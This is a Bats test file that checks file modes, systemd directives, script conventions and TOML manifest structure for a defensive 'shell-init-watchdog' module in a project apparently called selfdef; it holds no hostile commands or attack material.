@test "INVARIANT (shell-init-watchdog timer unit file mode is 0644 — systemd unit-file mode convention)" {
    # Sister to brain-wide systemd unit-file mode INVARIANT
    # family. systemd unit files MUST be chmod 0644 (world-
    # readable + root-write-only). Locks the timer unit-file
    # mode discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        m=$(stat -c '%a' "${t}")
        [ "${m}" = "644" ]
    done
}

@test "INVARIANT (shell-init-watchdog timer unit declares Persistent= directive — boot-catchup-policy contract)" {
    # Sister to brain-wide systemd timer Persistent= INVARIANT
    # family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Persistent=' "${t}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script file exists in module systemd/ dir — ExecStart-target source-of-truth contract)" {
    # Sister to brain-wide ExecStart-target INVARIANT family.
    # The watchdog .service's ExecStart points at
    # /usr/local/libexec/selfdef/<slug>-watchdog.sh which is
    # the runtime install path; the source of truth lives at
    # modules/<slug>-watchdog/systemd/<slug>-watchdog.sh.
    # A regression that lost the script file would break
    # the cargo-deb manifest install + leave ExecStart
    # dangling. Locks the source-script-exists discipline
    # on the shell-init-watchdog substrate.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    [ -f "${script_dir}/shell-init-watchdog.sh" ] ||     [ -n "$(ls "${script_dir}"/*.sh 2>/dev/null)" ]
}

@test "INVARIANT (shell-init-watchdog timer's Unit= field references a .service in the same module dir — co-located unit-pair binding contract)" {
    # Sister to brain-wide timer Unit= INVARIANT family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        unit=$(grep -E '^Unit=' "${t}" | head -1 | cut -d= -f2)
        [ -n "${unit}" ]
        [ -f "${timer_dir}/${unit}" ]
    done
}

@test "INVARIANT (shell-init-watchdog .sh script is executable (mode includes +x) — script-runnable contract)" {
    # Sister to brain-wide script-executable INVARIANT family.
    # The watchdog .sh script MUST be chmod +x so systemd's
    # ExecStart can invoke it without needing a bash prefix.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        [ -x "${s}" ]
    done
}

@test "INVARIANT (shell-init-watchdog README.md exists in module dir — operator-doc-trail contract)" {
    # Sister to brain-wide module-doc-trail INVARIANT family.
    # Every watchdog module ships a README.md documenting its
    # probe target + alert semantics + remediation. A
    # regression that lost the README would leave operators
    # without per-module ops docs.
    readme="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/README.md"
    [ -f "${readme}" ]
}

@test "INVARIANT (shell-init-watchdog service Documentation URL references github.com/cyberpunk042/selfdef — canonical-vcs operator-doc-resolve contract)" {
    # Sister to brain-wide Documentation URL canonical INVARIANT
    # family. The Documentation= URL MUST reference the github
    # repo + module README path so operators can resolve docs
    # offline (via git checkout) or online (via github browser).
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=.*github.com/cyberpunk042/selfdef' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script uses set -u flag — undefined-variable strict-mode contract)" {
    # Sister to brain-wide Bash strict-mode INVARIANT family.
    # Watchdog scripts MUST declare set -u (exit on
    # undefined variable). Without -u, typos in env-var names
    # silently expand to empty strings, masking bugs.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '^set -u' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script declares shebang #!/bin/bash or env bash — bash-interpreter contract)" {
    # Sister to brain-wide bash-shebang INVARIANT family.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -1 "${s}" | grep -qE '#!/.*bash|#!/usr/bin/env bash'
    done
}

@test "INVARIANT (shell-init-watchdog .sh script uses logger -t selfdef- canonical tag — SDD-062 logger-tag contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script emits canonical severity vocabulary {ok,warn,alert} — bounded-severity contract)" {
    # Sister to brain-wide bounded-severity INVARIANT family.
    # Watchdog scripts emit logger -t selfdef-<name> -- {...severity:...}
    # with severity in the canonical vocabulary. A regression
    # introducing custom severity values (info, error, critical)
    # would break operator-side filtering.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '"severity":"(ok|warn|alert)"' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script tag selfdef-shell-init matches module name — SDD-062 tag-canonical contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # The tag passed to logger -t MUST exactly match selfdef-shell-init
    # so operator triage via journalctl _SYSTEMD_UNIT or
    # SYSLOG_IDENTIFIER filtering surfaces the right module.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script declares profile-aware exit behavior — operator-extension profile-dispatch contract)" {
    # Sister to brain-wide profile-aware INVARIANT family.
    # Scripts MUST handle PROFILE=enforce vs report differently.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'PROFILE.*enforce|enforce.*PROFILE|profile.*enforce' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script declares baseline file path — operator-extensible baseline-state contract)" {
    # Sister to brain-wide baseline-state INVARIANT family.
    # Delta-scan watchdogs MUST declare a BASELINE variable referencing
    # /var/lib/selfdef/ so operators know where baseline state lives.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '/var/lib/selfdef/|BASELINE' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script declares MODULE-suffixed tag in logger -t — module-name-tag-consistency contract)" {
    # Sister to SDD-062 tag-canonical INVARIANT family. The tag passed to
    # logger -t MUST include the module slug so journalctl filtering by
    # tag surfaces only this watchdog's events.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script file is non-empty (size > 100 bytes) — non-trivial-script contract)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        size=$(stat -c '%s' "${s}")
        [ "${size}" -gt 100 ]
    done
}

@test "INVARIANT (shell-init-watchdog .sh script has >20 lines — non-trivial-watchdog-body contract)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        lines=$(wc -l <"${s}")
        [ "${lines}" -gt 20 ]
    done
}

@test "INVARIANT (shell-init-watchdog .service unit file has >5 lines of directives — non-trivial-unit-file contract)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        lines=$(wc -l <"${s}")
        [ "${lines}" -gt 5 ]
    done
}

@test "INVARIANT (shell-init-watchdog .service unit ExecStart references /usr/local/libexec/selfdef/ path — canonical-binary-path contract)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .timer file exists at canonical path modules/shell-init-watchdog/systemd — canonical-systemd-dir layout)" {
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    [ -d "${timer_dir}" ]
    n=$(ls "${timer_dir}"/*.timer 2>/dev/null | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (shell-init-watchdog module.toml exists at canonical path modules/shell-init-watchdog/ — module-manifest existence 72-cycle)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    [ -f "${mtoml}" ]
}

@test "INVARIANT (shell-init-watchdog systemd dir exists at modules/shell-init-watchdog/systemd — systemd-dir-existence 73-cycle)" {
    sd="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    [ -d "${sd}" ]
}

@test "INVARIANT (shell-init-watchdog systemd dir is non-empty — systemd-content-presence 74-cycle)" {
    sd="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    n=$(ls "${sd}" | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (shell-init-watchdog .service file size > 100 bytes — substantial-service-unit 75-cycle)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        size=$(stat -c '%s' "${s}")
        [ "${size}" -gt 100 ]
    done
}

@test "INVARIANT (shell-init-watchdog .timer file size > 50 bytes — substantial-timer-unit 76-cycle)" {
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        size=$(stat -c '%s' "${t}")
        [ "${size}" -gt 50 ]
    done
}

@test "INVARIANT (shell-init-watchdog README.md file size > 100 bytes — substantial-readme 77-cycle)" {
    readme="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/README.md"
    size=$(stat -c '%s' "${readme}")
    [ "${size}" -gt 100 ]
}

@test "INVARIANT (shell-init-watchdog .service Documentation URL is HTTP/HTTPS — operator-doc-link-protocol 78)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=(http|https)://' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script has shebang line — POSIX-conformant 79)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -1 "${s}" | grep -qE '^#!'
    done
}

@test "INVARIANT (shell-init-watchdog .sh script declares set flag in first 50 lines — strict-mode-prologue 80)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -50 "${s}" | grep -qE '^set -'
    done
}

@test "INVARIANT (shell-init-watchdog module.toml size > 200 bytes — substantial-watchdog-manifest 81)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    size=$(stat -c '%s' "${mtoml}")
    [ "${size}" -gt 200 ]
}

@test "INVARIANT (shell-init-watchdog .service file is non-empty — non-trivial-unit-file 82)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        [ -s "${s}" ]
    done
}

@test "INVARIANT (shell-init-watchdog .timer file is non-empty — non-trivial-timer-file 83)" {
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        [ -s "${t}" ]
    done
}

@test "INVARIANT (shell-init-watchdog .sh script body has at least one variable assignment — non-vacuous-script 84)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '^[a-zA-Z_]+=' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog .sh script path matches systemd dir layout — canonical-script-co-location 85)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    [ -d "${script_dir}" ]
    n=$(ls "${script_dir}"/*.sh 2>/dev/null | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (shell-init-watchdog module.toml has install_paths section — SDD-026 mutation-manifest 86)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^\[install_paths\]' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml install_paths.paths non-empty list 87)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert isinstance(ps, list) and len(ps) > 0
"
}

@test "INVARIANT (shell-init-watchdog module.toml install_paths.paths only absolute paths 88)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
for p in ps:
    assert isinstance(p, str) and p.startswith('/'), f'{p!r} not absolute'
"
}

@test "INVARIANT (shell-init-watchdog module.toml provides list non-empty 89 — capability-export-present)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
p = data.get('provides')
assert isinstance(p, list) and len(p) >= 1
"
}

@test "INVARIANT (shell-init-watchdog module.toml has at least 3 entries in install_paths.paths — substantial-manifest 90)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert len(ps) >= 3, f'expected >=3 paths, got {len(ps)}'
"
}

@test "INVARIANT (shell-init-watchdog module.toml install_paths.paths includes /etc/ entry — config-staging 91)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any(p.startswith('/etc/') for p in ps)
"
}

@test "INVARIANT (shell-init-watchdog module.toml install_paths.paths has /usr/local/libexec/selfdef/ entry 92)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any('libexec/selfdef' in p for p in ps)
"
}

@test "INVARIANT (shell-init-watchdog module.toml install_paths.paths has /var/ entry 93 — state-staging)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any(p.startswith('/var/') for p in ps)
"
}

@test "INVARIANT (shell-init-watchdog module.toml [install_paths] declared at line beginning — TOML-section-header 94)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^\[install_paths\]' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml [install] block declared at line beginning — TOML-section-header 95)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^\[install\]' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml uses TOML key-value syntax — well-formed-TOML 96)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^name[[:space:]]*=' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml name field uses double-quoted string syntax — TOML-string-quote 97)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^name[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml version field uses double-quoted string syntax — TOML-string-quote 98)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^version[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml category field double-quoted — TOML-string-quote 99)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^category[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml summary field double-quoted — TOML-string-quote 100)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^summary[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml name field matches module dir basename — TOML-name-dir-coherence 101)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^name[[:space:]]*=[[:space:]]*"shell-init-watchdog"' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml top-level keys before any [section] — TOML-top-level-keys-first 102)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
with open('${mtoml}') as fp:
    for ln in fp:
        s = ln.strip()
        if not s or s.startswith('#'): continue
        if s.startswith('['): break
        assert '=' in ln
        break
"
}

@test "INVARIANT (shell-init-watchdog module.toml file is UTF-8 encoded — TOML-encoding-contract 103)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    file "${mtoml}" | grep -qE 'UTF-8|ASCII text'
}

@test "INVARIANT (shell-init-watchdog module.toml does not contain CRLF line endings — LF-only-contract 104)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    ! grep -qE $'\r' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml ends with newline — POSIX-line-ending-contract 105)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    last_char=$(tail -c 1 "${mtoml}" | od -An -c | tr -d ' ')
    [ "${last_char}" = "\\n" ]
}

@test "INVARIANT (shell-init-watchdog module.toml does not contain leading tabs — TOML-indentation-canonical 106)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    ! grep -qP '^\t' "${mtoml}"
}

@test "INVARIANT (shell-init-watchdog module.toml does not start with UTF-8 BOM — TOML-no-BOM-canonical 107)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    first3=$(head -c 3 "${mtoml}" | od -An -tx1 | tr -d ' ')
    [ "${first3}" != "efbbbf" ]
}

@test "INVARIANT (shell-init-watchdog module.toml file size exceeds 200 bytes — TOML-content-floor-canonical 108)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    sz=$(wc -c < "${mtoml}")
    [ "${sz}" -gt 200 ]
}

@test "INVARIANT (shell-init-watchdog module.toml has top-level category field with non-empty string value — TOML-category-field-canonical 109)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
cat = data.get('category')
assert isinstance(cat, str) and cat, f'category must be non-empty string, got {cat!r}'
"
}

@test "INVARIANT (shell-init-watchdog module.toml has top-level phase field with value in bounded-vocab {main,pre,post} — TOML-phase-vocab-canonical 110)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ph = data.get('phase')
assert ph is None or ph in ('main','pre','post'), f'phase if present must be main|pre|post, got {ph!r}'
"
}

@test "INVARIANT (shell-init-watchdog module.toml has [install] section header at start-of-line — TOML-install-section-header-canonical 111)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    grep -qE '^\[install\]$' "${mtoml}"
}
